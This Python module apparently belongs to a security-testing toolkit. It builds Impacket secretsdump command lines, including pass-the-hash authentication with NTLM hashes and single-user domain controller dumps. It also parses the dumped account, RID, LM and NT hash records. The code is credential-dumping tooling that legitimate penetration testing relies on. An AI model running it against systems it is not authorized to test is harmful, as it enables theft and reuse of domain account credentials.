from __future__ import annotations

import re
from typing import Any

EMPTY_LM_HASH = "aad3b435b51404eeaad3b435b51404ee"
HASH_RECORD_PATTERN = re.compile(
    r"^(?P<account>[^:]+):(?P<rid>\d+):(?P<lm>[A-Fa-f0-9]{32}):(?P<nt>[A-Fa-f0-9]{32}):::$"
)


def _credential_target(target: str, auth_context: dict[str, Any]) -> str:
    username = str(auth_context.get("username") or "").strip()
    password = str(auth_context.get("password") or "").strip()
    domain = str(auth_context.get("domain") or "").strip()
    account = (
        f"{domain}/{username}"
        if domain and "\\" not in username and "@" not in username
        else username
    )
    if password:
        return f"{account}:{password}@{target}"
    return f"{account}@{target}"


def _hash_args(auth_context: dict[str, Any]) -> list[str]:
    ntlm_hash = str(auth_context.get("ntlm_hash") or "").strip()
    if not ntlm_hash:
        return []
    return ["-hashes", f"{EMPTY_LM_HASH}:{ntlm_hash}"]


def build_secretsdump_command(
    binary: str,
    *,
    target: str,
    auth_context: dict[str, Any],
    just_dc_user: str | None = None,
) -> list[str]:
    normalized_binary = str(binary or "").strip()
    if not normalized_binary:
        raise ValueError("secretsdump binary must not be blank")
    command = [
        normalized_binary,
        *_hash_args(auth_context),
    ]
    if just_dc_user:
        command.extend(["-just-dc-user", just_dc_user])
    command.append(_credential_target(target, auth_context))
    return command


def extract_hash_records(value: str, *, source: str) -> list[dict[str, Any]]:
    records: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()
    for raw_line in str(value or "").splitlines():
        match = HASH_RECORD_PATTERN.search(raw_line.strip())
        if match is None:
            continue
        account = str(match.group("account") or "").strip()
        nt_hash = str(match.group("nt") or "").strip()
        signature = (account.lower(), nt_hash.lower())
        if not account or not nt_hash or signature in seen:
            continue
        seen.add(signature)
        records.append(
            {
                "account_name": account,
                "rid": str(match.group("rid") or "").strip(),
                "lm_hash": str(match.group("lm") or "").strip(),
                "nt_hash": nt_hash,
                "source": source,
            }
        )
    return records
